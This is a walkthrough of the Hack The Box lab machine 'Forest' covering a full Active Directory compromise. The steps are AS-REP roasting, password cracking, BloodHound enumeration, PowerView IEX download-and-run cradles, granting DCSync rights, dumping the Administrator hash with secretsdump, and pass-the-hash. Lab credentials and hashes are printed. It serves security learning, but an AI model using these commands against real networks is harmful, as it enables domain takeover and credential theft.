# Forest

## Información General

<h3> Difficult: <img src="https://img.shields.io/badge/Easy-green"> </h3>

<h3> Operating system: Windows</h3>

<h3> Exploited vulnerability: DCSync Exploitation - Secretsdump.py </h3>

<h3> Date: 19/11/2025 </h3>

<h3> Link: <a href="https://app.hackthebox.com/machines/212/information" target="_blank">Forest</a></h3>

### *Read this document in spanish* <a href="forest.md">Forest</a>

## Recognition

**HTB** provides us with the IP address of the target machine: **10.129.219.42**

I'm going to set the target VM's IP address in the **/etc/hosts** file; I'm going to call it **htb.local**.

### Ping

Depending on the result, we can deduce whether it is a Linux or Windows machine, for example:

```
ping -c 1 10.129.219.42
```

Its TTL is 128. Therefore, it's a Windows machine.

### Open port scan

#### TCP port scan

The command I use with nmap is:

```
sudo nmap -p- --open -sS -sC -sV --min-rate 2000 -n -vvv -Pn 10.129.219.42
```

<p align="center"> 
<img src="images/Pasted image 20251114115615.png" width="600" alt="Resultado de Nmap">
</p>

<div align="center">

| Open port | Service      | Version                                                                                    |
| --------- | ------------ | ------------------------------------------------------------------------------------------ |
| 53        | domain       | Simple DNS Plus                                                                            |
| 88        | kerberos-sec | Microsoft Windows Kerberos (server time: 2025-11-14 10:56:20Z)                             |
| 135       | msrpc        | Microsoft Windows RPC                                                                      |
| 139       | netbios-ssn  | Microsoft Windows netbios-ssn                                                              |
| 389       | ldap         | Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name) |
| 445       | microsoft-ds | Microsoft Windows Server 2008 R2 - 2012 microsoft-ds (workgroup: HTB)                      |
| 464       | kpasswd5?    | -                                                                                          |
| 593       | ncacn_http   | Microsoft Windows RPC over HTTP 1.0                                                        |
| 636       | tcpwrapped   | -                                                                                          |
| 3269      | tcpwrapped   | -                                                                                          |
| 5985      | http         | Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)                                                    |
| 9389      | mc-nmf       | .NET Message Framing                                                                       |
| 47001     | http         | Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)                                                    |
| 49664     | unknown      | -                                                                                          |
| 49666     | unknown      | -                                                                                          |
| 49668     | unknown      | -                                                                                          |
| 49671     | unknown      | -                                                                                          |
| 49676     | ncacn_http   | Microsoft Windows RPC over HTTP 1.0                                                        |
| 49677     | unknown      | -                                                                                          |
| 49681     | unknown      | -                                                                                          |
| 49698     | unknown      | -                                                                                          |
| 49905     | unknown      | -                                                                                          |
</div>

## Exploration

### 1. We used the crackmapexec tool to find out what we were dealing with.

Port 53 is the DNS protocol. This means there's an Active Directory on this machine.

We have the Samba protocol open on ports 139 and 445. We'll use the crackmapexec tool to find out what we're dealing with.

```
crackmapexec smb 10.129.219.42
```

**SMB         10.129.219.42  445    FOREST           [*] Windows 10 / Server 2016 Build 14393 x64 (name:FOREST) (domain:htb.local) (signing:True) (SMBv1:False)**

When the AD appears signed by the smb, there are many attacks that it cannot carry out, such as **SMB Signing** prevents NTLM Relay, **MITM attacks**, and **traffic manipulation**.

### 2. We check if it has shared resources

```
crackmapexec smb ip-maquina-victima --shares
```

This command usually fails; it has failed me personally. Another alternative would be to use this command:

```
smbclient -L ip-maquina-victima -N
```

Lists directories with a null session

<p align="center"> 
<img src="images/Pasted image 20251117105541.png" width="600" alt="Resultado de Nmap">
</p>

This suggests to me that there's nothing shared.

### 3. Enumeración del dominio

In the `/etc/hosts` file, I set the IP address of the victim machine along with the domain name.

We begin by sending a DNS request to our Domain Controller.

```
dig @10.129.219.42 htb.local
```

<p align="center"> 
<img src="images/Pasted image 20251117110307.png" width="600" alt="Resultado de Nmap">
</p>

It seems to be going well, the next step would be to **list the mail servers**

```
dig @10.129.219.42 htb.local mx
```

<p align="center"> 
<img src="images/Pasted image 20251117110530.png" width="600" alt="Resultado de Nmap">
</p>

We could add those domains to **etc/hosts**, but we wouldn't achieve much.

The next step would be to list the **new servers**.

```
dig @10.129.219.42 htb.local ns
```

But it's not working for me.

We could also try **enumerating domains**.

```
dig @10.129.219.42 htb.local axfr
```

But that doesn't work either.

### 4. Enumeration of users, groups, user descriptions (LDAP)

#### List users

With the **rpcclient** tool we can accomplish this:

```
rpcclient -U "" 10.129.219.42 -N enumdomusers
```

<p align="center"> 
<img src="images/Pasted image 20251117112944.png" width="600" alt="Resultado de Nmap">
</p>

#### List groups

```
rpcclient -U "" 10.129.219.42 -N enumdomgroups
```

<p align="center"> 
<img src="images/Pasted image 20251117113018.png" width="600" alt="Resultado de Nmap">
</p>

The next step would be to find out which users make up the admin group.

```
querygroupmem 0x200
```

<p align="center"> 
<img src="images/Pasted image 20251117113221.png" width="600" alt="Resultado de Nmap">
</p>

Then, we would need to find out which users they are referring to.

```
queryuser 0x1f4
```

<p align="center"> 
<img src="images/Pasted image 20251117113351.png" width="600" alt="Resultado de Nmap">
</p>

#### List user descriptions

```
querydispinfo
```

<p align="center"> 
<img src="images/Pasted image 20251117113613.png" width="600" alt="Resultado de Nmap">
</p>

Sometimes the user's password can be found in the user descriptions, but in this case it is not included.

## Exploitation

### 5. Obtain the user's TGT

```
rpcclient -U "" 10.129.219.42 -N -c "enumdomusers" | grep -oP '\[.*?\]' | grep -v 0x | tr -d '[]'
```

<p align="center"> 
<img src="images/Pasted image 20251117114651.png" width="600" alt="Resultado de Nmap">
</p>

I use this regular expression to get users for a .txt file to carry out an attack

```
impacket-GetNPUsers htb.local/ -no-pas -usersfile user.txt
```

<p align="center"> 
<img src="images/Pasted image 20251117114942.png" width="600" alt="Resultado de Nmap">
</p>

**svc-alfresco** gives me a hash, we'll use **john the ripper** to crack the password

```
john -w:$(locate rockyou.txt) hash.txt
```

<p align="center"> 
<img src="images/Pasted image 20251117115250.png" width="600" alt="Resultado de Nmap">
</p>

We validate the user with crackmapexec

user: svc-alfresco <br>
pass: s3rvice

```
crackmapexec smb 10.129.219.42 -u 'svc-alfresco' -p 's3rvice'
```

<p align="center"> 
<img src="images/Pasted image 20251117115552.png" width="600" alt="Resultado de Nmap">
</p>

It is valid

```
crackmapexec smb 10.129.219.42 -u 'svc-alfresco' -p 's3rvice' --shares
```

<p align="center"> 
<img src="images/Pasted image 20251117115956.png" width="600" alt="Resultado de Nmap">
</p>

We could try enumerating directories and getting the group.xml file, but that's not the right approach.

### 6. winrm y evil-winrm

We use this tool if **port 5985 is open** and if there is a **pwn3d!** in the following command:

```
crackmapexec winrm 10.129.219.42 -u 'user' -p 'pass' 
```

<p align="center"> 
<img src="images/Pasted image 20251117120354.png" width="600" alt="Resultado de Nmap">
</p>

Then, using the **evil-winrm** tool, we obtained an interactive shell

```
evil-winrm -i 10.129.219.42 -u 'svc-alfresco' -p 's3rvice'
```

<p align="center"> 
<img src="images/Pasted image 20251117121337.png" width="600" alt="Resultado de Nmap">
</p>

User flag

<p align="center"> 
<img src="images/Pasted image 20251117122123.png" width="600" alt="Resultado de Nmap">
</p>

## PostExplotation

```
net user svc-alfresco
```

<p align="center"> 
<img src="images/Pasted image 20251117174241.png" width="600" alt="Resultado de Nmap">
</p>

I'll start by investigating which group the user **svc-alfresco** belongs to.

```
net groups
```

<p align="center"> 
<img src="images/Pasted image 20251117174647.png" width="600" alt="Resultado de Nmap">
</p>

However, the **service accounts** group does not appear. Therefore, I will use the **ldapdomaindump** tool.

```
ldapdomaindump -u 'htb.local\svc-alfresco' -p 's3rvice' 10.129.219.42
```

<p align="center"> 
<img src="images/Pasted image 20251117172402.png" width="600" alt="Resultado de Nmap">
</p>

```
python3 -m http.server 80
```

This sets up a server and allows you to view the **domain_groups.html** file. In this case, it helps you understand which group **service-account** is linked to.

<p align="center"> 
<img src="images/Pasted image 20251117172919.png" width="600" alt="Resultado de Nmap">
</p>

In conclusion, **service-account** is within the **Domain Users** group.

### BloodHound and neo4j installation

```
sudo apt install docker.io
docker-compose
curl -L https://ghst.ly/getbhce | sudo docker-compose -f - up
```

<p align="center"> 
<img src="images/Pasted image 20251118002607.png" width="600" alt="Resultado de Nmap">
</p>

I am introducing for the first time:

user: admin <br>
contraseña: 4OuPGC6o0pdAolzVY0dQSKiAYIOkUdoU

<p align="center"> 
<img src="images/Pasted image 20251118002728.png" width="600" alt="Resultado de Nmap">
</p>

### zip file from active directory

#### On my Kali machine

```
wget https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Collectors/SharpHound.ps1
```

Then I prepare the server to share the **SharpHound.ps1** file:

```
python3 -m http.server 80
```

#### On my victim Windows machine

```
IEX(New-Object Net.WebClient).downloadString('http://10.10.14.55/SharpHound.ps1')
Invoke-BloodHound -CollectionMethod All
```

The first command downloads SharpHound.ps1 and executes it directly into memory.

The second command collects all domain information and generates the ZIP file for analysis with BloodHound.

```
download C:\\Users\\svc-alfresco\\Documents\\bh\\20251117142343_BloodHound.zip data.zip
```

I downloaded the zip file to my attacking Kali Linux machine.

<p align="center"> 
<img src="images/Pasted image 20251117232814.png" width="600" alt="Resultado de Nmap">
</p>

#### ALTERNATIVE

There is a script that helps us obtain data from Active Directory, which would be the following:

```
#!/bin/bash 

# I always messed up the bloodhound-python syntax. This simplifies the process and asks the users for each parameter and fires off the bloodhound-python
# bloodhound-python -d <domain> -u <username> -p <password> -gc <domain> -c all -ns <ip of domain> 

echo "Domain: "
read domain 

echo "Username: "
read username

echo "Password: "
read password

echo "IP of Domain: " 
read ip_address

bloodhound-python -d $domain -u $username -p $password -gc $domain -c all -ns $ip_address
```

Don't forget to grant execution permission. Then enter the data:

<p align="center"> 
<img src="images/Pasted image 20251118023011.png" width="600" alt="Resultado de Nmap">
</p>

The result will be the JSON files, which will then be entered into Bloodhound.

*20251118013951_computers.json  20251118013951_containers.json  20251118013951_domains.json  20251118013951_gpos.json  20251118013951_groups.json  20251118013951_ous.json  20251118013951_users.json*

### BloodHound run

We uploaded the zip files to Bloodhound. **Important note: the method that worked for me was the one listed as "alternative," I don't know why. Researching Bloodhound, it's very picky about accepting .zip or JSON files that come from Active Directory.**

<p align="center"> 
<img src="images/Pasted image 20251118023826.png" width="600" alt="Resultado de Nmap">
</p>

Then, I go to **pathfinding** and configure the following:

<p align="center"> 
<img src="images/Pasted image 20251118024005.png" width="600" alt="Resultado de Nmap">
</p>

The idea behind this is to see the path that the user **svc-alfresco** takes to **HTB.LOCAL** in order to discover any vulnerabilities.

<p align="center"> 
<img src="images/Pasted image 20251118024153.png" width="600" alt="Resultado de Nmap">
</p>

Looking at the graph and investigating what it means to belong to the **exchange windows permissions** group, which basically means creating, deleting, or modifying users and groups.

<p align="center"> 
<img src="images/Pasted image 20251118163326.png" width="600" alt="Resultado de Nmap">
</p>

Therefore, I will now attempt to create a user on the Windows VM.

```
net user emperador emperador123 /add /domain
net user emperador
```

<p align="center"> 
<img src="images/Pasted image 20251118165105.png" width="600" alt="Resultado de Nmap">
</p>

The idea is that this new user will be in the **Exchange Window Permissions** group, which is where I can perform the **DCSync** attack.

```
net group "Exchange Windows Permissions" emperador /add
```

I'm preparing the following commands that I've obtained here. (In this image, we can see an exploit that I can carry out on the **new user** created by **svc-alfreedo**, which consists of granting it maximum privileges.)

<p align="center"> 
<img src="images/Pasted image 20251118024453.png" width="600" alt="Resultado de Nmap">
</p>

```
$SecPassword = ConvertTo-SecureString 'emperador123' -AsPlainText -Force
```

*Converts the plaintext password (`'emperador123`) into a **SecureString**, the format PowerShell uses to securely store passwords.*

```
$Cred = New-Object System.Management.Automation.PSCredential('htb.local\emperador', $SecPassword)
```

Create an object of type **PSCredential**, containing:

- The user `htb.local\emperador`
- The secure password created earlier

**You will use this object later to execute commands with these credentials.*

I downloaded the **PowerView.ps1** tool to my Kali system to enable the new user to perform the DCSync attack.

```
wget https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/refs/heads/master/Recon/PowerView.ps1
```

I need to share this file with my Windows machine.

```
python3 -m http.server 8000
```

Then to execute the following commands:

```
IEX(New-Object Net.WebClient).downloadString('http://10.10.14.55:8000/PowerView.ps1')
```

**What does it do?**

1. `New-Object Net.WebClient` → creates a web client.

2. `.downloadString('URL')` → downloads the PowerView script content.

3. `IEX(...)` → **executes** the downloaded content.

**IEX = Invoke-Expression**, executes code in memory.

This loads PowerView in the current session without saving it to disk.

Then

```
Add-DomainObjectAcl -Credential $Cred -TargetIdentity "DC=htb,DC=local" -PrincipalIdentity emperador -Rights DCSync
```

What does it do?

This command uses PowerView to modify the **Access Control Lists (ACLs)** in the domain.

- `-Credential $Cred` → the command runs using the created credentials.

- `-TargetIdentity "DC=htb,DC=local"` → indicates that you want to modify the permissions **of the domain object**.

- `-PrincipalIdentity emperador` → this is the user to whom you will grant permissions.

- `-Rights DCSync` → adds **DCSync** rights to the user.

Then, on my attacker's machine, this command should run:

```
impacket-secretsdump htb.local/emperador@10.129.219.42
```

<p align="center"> 
<img src="images/Pasted image 20251119004423.png" width="600" alt="Resultado de Nmap">
</p>

I get:

User: **Administrator** <br>
Hash:  **32693b11e6aa90eb43d32c72a07ceea6** 

### Important fact

I have to run these commands in the same session, otherwise the **impacket-secretsdump** tool won't work. Note that the **svc-alfresco** user session is quite unstable.

```
$SecPassword = ConvertTo-SecureString 'emperador123' -AsPlainText -Force

$Cred = New-Object 
System.Management.Automation.PSCredential('htb.local\emperador', $SecPassword)

IEX(New-Object Net.WebClient).downloadString('http://10.10.14.55:8000/PowerView.ps1')

Add-DomainObjectAcl -Credential $Cred -TargetIdentity "DC=htb,DC=local" -PrincipalIdentity emperador -Rights DCSync
```

I now use the **crackmapexec** tool to check if the user has the highest privileges; if so, they have **Pw3d!**

<p align="center"> 
<img src="images/Pasted image 20251119005015.png" width="600" alt="Resultado de Nmap">
</p>

**He has it**

I obtain the shell of the **Administrator** user

```
evil-winrm -i 10.129.219.42 -u 'Administrator' -H '32693b11e6aa90eb43d32c72a07ceea6'
```

<p align="center"> 
<img src="images/Pasted image 20251119005550.png" width="600" alt="Resultado de Nmap">
</p>

I get the root flash

<p align="center"> 
<img src="images/Pasted image 20251119005439.png" width="600" alt="Resultado de Nmap">
</p>

## Conclusion

The **Forest** machine from **Hack The Box** proved quite complex, as this is only my second time working with an Active Directory environment. It's worth noting that the Windows machine accessed during the process is quite unstable, which adds further difficulty to the exploitation.

In the enumeration phase, I obtained the first users using **rpcclient**, enumerating both accounts and groups in the domain. Subsequently, I used the **impacket-GetNPUsers** tool to identify a user vulnerable to AS-REP Roasting and then used **John the Ripper** to recover their password.

For the domain analysis, I deployed **BloodHound** using _docker-compose_ and collected the Active Directory information using the **SharpHound** collector, obtaining the necessary .json files. Thanks to the graph generated by BloodHound, I was able to identify the vulnerability associated with the **Exchange Windows Permissions** group, specifically the abuse of **DCSync** permissions.

Finally, after applying the exploit indicated in BloodHound (with some adjustments to the commands), I used **impacket-secretsdump** to extract the hash of the **Administrator** user and obtain the last root flag.